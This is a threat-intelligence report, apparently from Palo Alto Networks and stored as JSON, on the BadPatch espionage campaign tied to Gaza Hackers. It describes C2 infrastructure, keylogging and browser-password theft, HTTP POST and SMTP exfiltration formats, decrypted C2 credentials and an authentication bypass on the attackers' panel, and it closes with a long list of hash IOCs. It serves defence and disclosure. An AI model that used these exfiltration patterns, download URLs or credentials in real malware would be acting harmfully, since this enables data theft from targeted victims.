                "While there is historic WHOIS for pal2me[.]net and shop8d[.]net, research into the registrant information suggests this is related to the ISP rather than the actors using the site for C2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also found the DNS RNAME a.faris.live[.]com was used, but this also seems to be related to the host ISP rather than the site owner."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Understanding that we were looking at a collection of linked malware C2 servers, we started to look into the attacks methods and malware that used this infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed initial attacks using this infrastructure were against victims via spear phishing.",
                "However, for the first time in any known Gaza Hackers-linked campaign, we also found a limited use of vulnerability exploits  RTF exploit CVE-2012-0158 documented by Citizenlab (Part 3  The Curious Case of the Shared Exploit).",
                "The attackers used the RTF exploit to download their BadPatch Windows malware from hacked WordPress site wp.piedslibres[.]com/wp/wp-includes/js/Next.scr."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We found a second attack sample that used the same exploit, that also downloaded the same malware from the compromised server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In most of the attacks we observed the malware will display a blank Microsoft Word decoy file, or a Microsoft Word file with error message:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "\"An error occurred, please try your request again later\"."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We did observe some variations in this attack.",
                "The first malware sample that we identified (compiled on 12 June 2012) dropped an Adobe Flash decoy file (Figure 2):"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2- Adobe Flash decoy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples typically employ decoy filenames tailored to the spear-phished target:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We collected 148 malware samples in this campaign, using the C2 servers that we identified, and grouped them into four categories:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Microsoft Visual Basic malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon infection the malware copies itself to %",
                "appdata%\\microsoft\\microsoft [",
                "0-9]{9-15}\\dwm.exe (9-15 digits in directory name Microsoft), and adds a link to the malware executable in the startup folder for persistence."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These variants include system information collection (operating system, computer name), keylogger output, and browser password collection from Internet Explorer, Chrome and Firefox."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Keylogger and system info exfiltration is done via HTTP Post:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "lms/getdata.php?myAction=add_line&macName=$&computer_id=App.EXEName&mac_address=&dns_domain=nnn&domain=bbb&content2=$FRESH:%20%20ESC%20pango2012ENTR&ver=3&mac_time=tt&patch_user_id=mgh2&patch_group_id=Label1(2).Caption"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "File exfiltration is done via SMTP port 26, with the SMTP credentials hardcoded encrypted in the malware code.",
                "Some mailbox examples:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "user: sender_b@pal4u[.]net\n password: sender@123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ubuntu_net@pal4u[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ubuntu_send@pal4u[.]net"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3- SMTP encryption settings"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The list of files for exfiltration are written to the malware folder as sysfiles.txt.",
                "A file 1.done is generated with content \"done\" after successful exfiltration.",
                "The file mac.txt contains the computer MAC address.",
                "Some versions exfiltrate recent files, others collect and exfiltrate files matching a hardcoded extension list:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "*.xls;*.xlsx;*.pdf;*.mdb;*.rar;*.zip*.doc;*.docx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "AutoIt Malware\nWe observed a shift from Visual Basic to AutoIt malware in this campaign around March 2016.",
                "AutoIt is a freeware BASIC-like scripting language designed for automating the Windows GUI and general-purpose scripting."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This malware achieves persistence by writing to %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft.lnk\" using the WScript object."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware deletes Chrome and Firefox cached password files, requiring the user to re-enter site passwords, affording the keylogger the opportunity to capture them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware can be instructed to kill the malware process by Process ID, or by hardcoded name."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It can update itself by downloading and executing a newer version:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "h__p://m103.pay2earn[.]net/public/versions/[\"svchost\" & $i & \".zip] (where i=1 to 7)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The new version is saved at%appdata%\\Microsoft\\updte\\svchost.scr."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Environment data exfiltration via POST\nIt will perform a WMI query to enumerate installed security products."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It stores data in log files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Specific attacker username stored at %appdata%\\Microsoft\\updte\\usu.log"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MAC address %appdata%\\Microsoft\\updte\\mac.log"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Errors are logged at %appdata%\\Microsoft\\updte\\log.log"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This data is exfiltrated along with Operating System version and architecture using HTTP POST:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "h__p://m103.pay2earn[.]net/devices/settings"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "/devices/settings?mac_address=<macAddress>&content=%20Start%20Downloader%20majdTest%201/2017Anti%20Type:%20%20%20OS%20Version%20=%20WIN_7%20|%20X64"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "h__p://m103.pay2earn[.]net/logs/new"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "/logs/new?name=<computerName>$&computer_id=App.EXEName&mac_address=<macAddress>&content=$%20Start%20Downloader%20%20majdTest%201/2017&patch_username=majd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Screenshots via SMTP"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware takes screenshots on the victim computer, exfiltrating them using SMTP (port 26) as GDIPlus_Image1.jpg and GDIPlus_Image2.jpg."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The SMTP configuration is saved as encrypted RC4 strings, decrypted with password !@#$%^&*()"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4- SMTP RC4 encrypted strings init"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mail is sent, in this example, using the string \"Start Downloader majdTest 1/2017\"."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5- SMTP mail sending function"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The emails are sent from an email address at the C2 server, to a recipient address on the same server.",
                "Decrypted example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "smtpserver: m103.pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fromname: sn@m103.pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fromaddress: sn@m103.pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "toaddress: asf@m103.pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "username: sn@m103.pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "password: sn_$_2016"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed a single variant using an obfuscated AutoIt script (5c6e531738c1380ec09c1ec0f1438cee5077e6cbade8af87710b8be2f0aaaac7).",
                "Another outlier variant was keylogger-only, supporting intercepting only Arabic and English characters (42adec426addf3fd0c6aff406b46fa82d901f5a9bed7758a243458961349a362)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Autoit downloader / dropper\nThis simple component downloads and executes malware from the C2 server (e.g. pal4u[.]net or m103.pay2earn[.]net)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256: 2d75335f8c7d4e956dcd637f480c94f6ed49a9870375aad0eee1e651d6e7ac02"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This downloader example also displays a decoy file (bbb.docx):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256: 2d75335f8c7d4e956dcd637f480c94f6ed49a9870375aad0eee1e651d6e7ac02"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Android Malware\nThe actors do not miss the opportunity to also collect data from the Android devices of their targets."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As well as the typical ability to update the malware, this Android malware collects and exfiltrates device files, SMS messages, voice calls, and can also be used to remotely record sound or video using the device.",
                "A follow-up blog will examine this malware in detail."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The threat actors have developed their own, custom system to manage the data exfiltrated by their victims, \"  \" (Records Management System).",
                "Server logon requires 2-Factor authentication (2FA)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7- RMS SMS 2FA"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6- RMS Logon Screen"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During the course of our research, we observed a newly introduced bug in their authentication.",
                "Navigating directly to the page sms.php bypassed the initial password entry requirement, taking us directly to the SMS verification page (Figure 6)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Further, we discovered that navigating directly to /lms/index.php no longer redirects the user to login.php, but instead granted authenticated access to the system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8- Records Management System"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This allowed us to enumerate the victims contacting the exfiltration server (Figure 9,) through March 2016."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9- Victims by country"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As reflects the nature of campaign, we notice a small overall number of victims.",
                "That the majority of victims appear domestic is also not unusual in such campaigns, although we also noted the actor infecting their own test machines in some cases (Figure 10)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10- Testing Logs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We find some hints in sample filenames, Microsoft Visual Project directory names, and HTTP POST parameters, suggesting the names of some of the actors involved in this campaign, and a possible link to an official Gaza Bureau."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "S:\\sh\\work files from shaaban\\4shopfiles tajas\\shop8d\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\Documents and Settings\\HADJYOUB.HADJ-1065B94515\\Bureau\\cm\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Possible nickname strings that we observed include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shaaban, Hadjyoub, OMR, mgh2, rashed, Shady, majd , f2b, jno, ajr , hmg, vip, 2ta, asf, h2m, mag"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The actors appear to name this malware Patch:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"\\2014-03-17\\exe\\gaza\\Project1.vbp\"\n V:\\Batch Versions\\"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In Arabic, P and B are phonetically similar, leading to common B/P misspellings."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Embedded strings:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"Old - update patch and check anti-virus.. \"\n\"PatchNotExit-- Check Version\"\n\"PatchNotExit-- download now\"\n\"PatchNotExit-- Version Patch\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Server communication parameters:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "lms/getdata.php?myAction=add_line&macName=$&computer_id=App.EXEName&mac_address=&dns_domain=nnn&domain=bbb&content2=$FRESH:%20%20ESC%20pango2012ENTR&ver=3&mac_time=tt&patch_user_id=mgh2&patch_group_id=Label1(2).Caption"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The patch_user_id parameter appears to refer to the individual actor managing this victim."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The oldest sample we observed has a compile date of 12 June 2012.",
                "The C2 server linked to that sample, pal2me[.]net, was also first registered on the same date.",
                "This campaign has been running for at least more than five years, and continues to this date."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The oldest sample we observed (above) supported exfiltration of victim data using email (technique is detailed in the malware analysis section):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92a685c0c8515ef55635760026039564ddd0b299a2b0c4812df3c40aba133812\nC:\\Users\\Shady\\Desktop\\only email with slide show\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Keylogger functionality is introduced:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "106deff16a93c4a4624fe96e3274e1432921c56d5a430834775e5b98861c00ea\nE:\\work here\\ready kl send recent files\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "New keylogger version:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "17a4126fb1fb19885d78c82271464d82af8618b7d1b7d8901666c1121ddb2ba1\nD:\\000 work\\21.3 GB\\newSpoofKL\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "New file exfiltration test version (details are in the malware analysis section):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9a8acd988089e7f9dd04f971374f766db519e854d42e8052b0d98b4c9c6b67e4\nY:\\My Work\\VB 6\\Get Files\\GFiles 14-09-2015 - Working tst only\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Visual Basic versions, new downloader:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "224b5af4ca4de234f03408487f075f0d638826cb6f65944a3e8dcbaac4372e79\nQ:\\newPatch\\downloader\\exe site\\shop\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Downloader version 2.8:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d906118fb36a0cc4e83121d4d606ad685645252e8e0791f793057499d8751bf0\nJ:\\dowloader 2 8\\downloader\\site\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Version M103, pointing at the currently-live C2 server m103.pay2earn[.]net.",
                "Current server registration dates to 8 February 2016, the compile date of this malware was 31 March 2016."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sha256 - d9253c808d83ace06f885479e0807246a29cb9967ea0d0855f5a3802825b13db\nW:\\newPatch\\exe vb m103 30 3 2016\\Project1.vbp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Diligence in investigating infrastructure associated with a previously documented campaign, led us to another possibly unrelated campaign, crossing paths in hosting."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This allowed us to uncover a previously unknown C2 and exfiltration infrastructure, associated malware, and the first time that weve observed this group using exploits."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The simplicity of the malware and relative unsophistication of C2, exfiltration and stolen data management belies the demonstrated fact that this very targeted, low-volume campaign has been working fine for these actors for five years, and continues today."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "AutoFocus users can view malware related to this attack using the BadPatch tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOCs can be found in the appendices of this report."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1a0c0a0c74d085d6e90c5d96517926218fc55cc161f5c1e5dbb897f40d1f5164"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "26e3d2dd7b70701aff8552889c899b7915b06f0b979a4766076681dd01abd978"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "16c151ffe5e439a9383900738b4f8938cd33ba1781b62d8e2ee0686336a7145c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9a4ed995dfd9d468715dfe4906265059aa3bb1e0d6ceb547e84001661a023a9d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f1e616aecf6205daaf6c55898f86092055fe85a3825837c688c2e7545f6efb7e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "db829b0d7396feaef2a4555b9d4fdf1b00d287dad93585e1c6c54f9cee0e9d4f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abaf5a7d82e6db68fb73af18bf1f5e37b200f04dcc6e34da98ad044d9f411022"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "04b8b48a795bcfe2b7344c2bbc409e85641e412c35ff490e7ae074e7d48698f7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "668b4c01e0493dc2b8b3a1b7134ce3811ef1449c2807ef6ca1c0b8356b90a2ed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "342de173d65d604e0935808b1d6a617060602c86e543bdf1c4c650812dec3883"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6180311025913c26ff8ac90b57b3fad61e21cdd896ea8b26a5ee14e6e663f6bb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1d2a85a88153061ea17c6eeb9394f1d969ed6f0db526c7ddf79919676d4ca012"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3bb663567994bae2da06ea84a75b5205b7fa38dd8253ab326bfa4c50a90939ac"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4a1a5456123ef756956cc1d9a53f44dab040421700edf051f21671abe7e61d69"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47ecddb2f7f7242a3fd6cf9d08715512644f3ca199e779f737762150765b3027"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "32667a9bfb24f505f351804d8516e2f5cf7f88ba6ef4de4db4463234ba4a3ea1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "68cd91e61a1bd6b5a1f39e45920c887be9603e85ca4e03b156cdc7acbe66f7c7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "56904fea473c40b9cf39de854a81896e8ba8f2bc1415101e69c25c065eb9773e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0274e5f807a951cc68c0fd5af3fc9fa7b8a7305609da8144dacf69d0d39a23a4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3ce1ad8a7f90404bdfc8157689742448ff675d094767a10c9cdf1e08ce068c55"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "acc351ce2d3bf1bacb10bf379c6575fdb98e7c0fc2c69d20a7a7e3cf34615ae1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "19c25fa8a43b9da08fb5a78c03c554f23c0635ce618e789296fd35d748603fd4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9e87eff7c42c077486531d6a178cab830c19aa787a18bc7ba5334a682cf82312"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1d4d3ad6a1330ada787c11dcf39bcf4864745aa440bfe1a45291f82b5467849f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "01d08050e532145ebb08398c51ac387979d34526918b8b21d0a3d0bed1ba3487"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b3847e10df393052222da931a96bedacf6d862e3470256dfb234a93947a23e82"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "71015d0586123eac15c36aa4747fb60d03e671d5b5b4608818258320e33512e7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c0e24060684d376068acdb40636392eb5627b410f9cb67428008415d288cb7f9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0be090f3b01713a28f5bc94feb41f07ccd2814e0c7a58f5226242f96e80baaec"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "20d337997e2a79015aa711bda443d2c0248959f15f007ec469839c7fa4418b9b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ef6e26502bb160be3154d7a34a461bbbc1bf8eaf3142c64658d14707836badec"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "40929deab63f001f99973dffe6674e8bf0347f5dc30b5fb2d38e00667b90be7b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "584de1b855adaabc329639d09c77512a5f05099ecd629698b04893ac58fba01c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "90a86513076a32328e654f241226f454a5b39d76ea1a3119432aa9bb4253f775"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "799c5a2dd25f180b4d4dda72da8da55bc6a99e2f01068880d7e3b58f8687242a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6bbfd7f427458a485946d09318260cc484191a7d2e6f20dc0c143065716ff378"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8c01e58a2523297599342e38b6f8559b67d82bc790963b7a96802f30d337f295"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f8b022d3be92bf893b92ea235dd171443ac61330d008a0a786a0af940f2c98a7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6ed9b8b0c478e30bc4f25bfcae3652b3937d735457b41146286173c54f3d5779"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "28fb8f3858df045f3a1979f66ac9793f89f42324fcac8339f9f0fb7e566dbf16"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "802a39b22dfacdc2325f8a839377c903b4a7957503106ce6f7aed67e824b82c2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "224b5af4ca4de234f03408487f075f0d638826cb6f65944a3e8dcbaac4372e79"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "39655262901bc4a35867fa458a6025aa1175613c57ef51336412c32ca61715a1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d49c16c0aacdb700f5afab86b20640a85c01d31b81c854c6a49eb62b8af68b68"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "99ea3a10ea564b980a10e969b9b70fdef9be0b53ea4dee331cac7ebbdef65c47"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a6c0ef11f8d3f12215a9d2d4d461f0eb92f4f305bdd32c2bb3e3a7196f8bb26d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8b322ebd9dfae74c531f70a32b7d5689c394c6e5455575de53cc8984f7ebdbe5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4c3a6c5a8a7a03581bf337dfb7572fb919a7d0414179019836b909e5e40921dc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "48845b4d384665b2078b1b4ed55a29fc4b2634e38d2c05ee29fb7a24e5a5c7f2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3984d2400880e2f87f0c0e0e9d8f0e8e4b81971b53f66d840d1733a1cba6ccb1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b9eb60c690b19a13da8717c4ba60e2bf9c4cda92fb9a723bed6011b08ea1b0ca"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1b6282350a25f9e362c68d359277746bc5039a0532e05375b06e9688622df6ba"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ca2e49411ca8c2f8071bc5e12a8266444db7c1a7d0651d9fa9422970024f2150"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5c6e531738c1380ec09c1ec0f1438cee5077e6cbade8af87710b8be2f0aaaac7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ecd6fa73cf527025792c4f1ee13acbd1c1219217f6da5aed2aaed11ea8453393"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fc06a74968ad0db68f26fa5e306a279728617fde7f3b8a8ddfb449f02bbac2c9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "934e56b74a5ca093857042c5b0371661134d29ea405d444bd2d602c74c20b9d2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4c4d9e0062225311584fbf25b79e2a5b9a98dc2a3a43e736621082d8a92f18fe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5e1173cc0c8226881a5fa21e6811e96db732c4ee9dfa2d3455c650d4522fe732"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e4400d9f128bf9ba924d94f1c87cfe882cc324d607ffdcbb03aaad6cdf71d2ef"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1dec4ec17c7bfe5abc9bb0a885e4cc5a2e5ab6a9676bb9f445402b84599ec915"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2f9eedcdda4f28ca08ece26a58e859062a6c0b9cf7f319b3eaa8d9f034c76d20"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ef03d20595daa112f7652a11f2f7c2cac37216dae9bbd1aa87e482fd204c858e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4246159ae6234697ed015c8c222ce053a7eaf83e2960d1c49339e72184be7e40"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b9440d29e2104cc3411c71c5db504dbc043c77aee24154ac68409df97c5eff49"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a33bccaa7d2d3797f25edfae846f1e7757b50633b374f8ce1faf7a5934784817"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3c55a81f460804e2e39a1d3dc556fa5a93fe7ce8c139f8b68f1e5ca98f62875c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0a376070679f6a31b2f6aaef23747f930544ab77ad01d30007f6d0ccf2bead60"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cdf964200bb9130c09d1bfd17677e2da5808c179a2cd6d49fa32780df1b5b92a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92a685c0c8515ef55635760026039564ddd0b299a2b0c4812df3c40aba133812"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e73dd4c69a9a9fedd40c290bad68115e3645e74d1d68af0d7fe77ef7c0c5e875"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e7fb8bf35fb9bfa2f20fcc293939aad71d5fc39af36defb5150e2f394bb1500e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cd933c6cc8450135deacd61a51e1b425ff7516cac078b92fe1b6f602e4c39e53"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "025ab87dc729cbf284104a8c9872b63e486ad8af9aef422906743feb0db04224"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "42adec426addf3fd0c6aff406b46fa82d901f5a9bed7758a243458961349a362"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78301ce0bb93dea81f4d70ebb224cc076e7f1e4c38b65afbbc1ad8d4c4882893"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5ea75fcdd2be820efdddc411fce9b6d277b66d3356ab8f79bcf542a4ce9fdfa0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c595e47f8e50e8f0ffdc3258f2dcc9411150c3ea00709341c6d4e42d578e46ae"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "201642c6d1341127aa0137e20db8a3d2da0412fb06ff14eae0c61f6174a44045"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fedf49896daa893608deaec7b36a4acb8fbedf7363788c35a6c0431ad0fadca9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "22ff8ce9840bae9c9c9aa107e689ec287abb93d585a469c442b295146b9c10c2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "30aa9b1c18bb494a01817b5fc0f7418efe2022e7335e815d96dcb8c1fe63e8e8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "830cb27f0c584d55267a4e0f6ddcb00c53ce1906946f5d490a26729d38d12057"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7370c81abf55a39918a537d1e49a51d74df2042883d11062383038367c864087"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d9253c808d83ace06f885479e0807246a29cb9967ea0d0855f5a3802825b13db"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ffea93677d1c404900ea5ba20631625ea2e28a22c3af02155c747f2f25429885"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a25abe1c21bec0c0259270aa2333ee1d1b6a327a356f5434c42558143a252afe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ce606c710aa001b09f0b51b78bf8675d8b1be4d99714b1a3b9ca245865fec508"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "98f57b4693bbe9d469821f5433004edafe6ddf8964fa1ef1465ee73fbce24e0c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "18c84b6f7e58b2867ec6f3e7c7998ac6901fd485d503d32c8fabff93744574d1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9b2c33764252c2bf807c837d80bffc21eeab87e7129c2d3e9b9b7a1eeee2de84"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "24a9c57bb4cbb3d1b89c4e7affad599d431de4f007d4c54a4da25a8a2ba4f116"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "17a4126fb1fb19885d78c82271464d82af8618b7d1b7d8901666c1121ddb2ba1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "278dba3857367824fc2d693b7d96cef4f06cb7fdc52260b1c804b9c90d43646d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2d75335f8c7d4e956dcd637f480c94f6ed49a9870375aad0eee1e651d6e7ac02"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5b84e8ad40e018b5d87a464e67173eebe2b268e816d9bb864f1d0f1441bebc7c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f52e47c6b0916655d7e8868bd79904e8825fdf98624d8c42192cae808543b0a5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c4f0ec52ce768f2ba36e4954e2afca3ef7ef46d757070a861cc6609d256a3fe1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
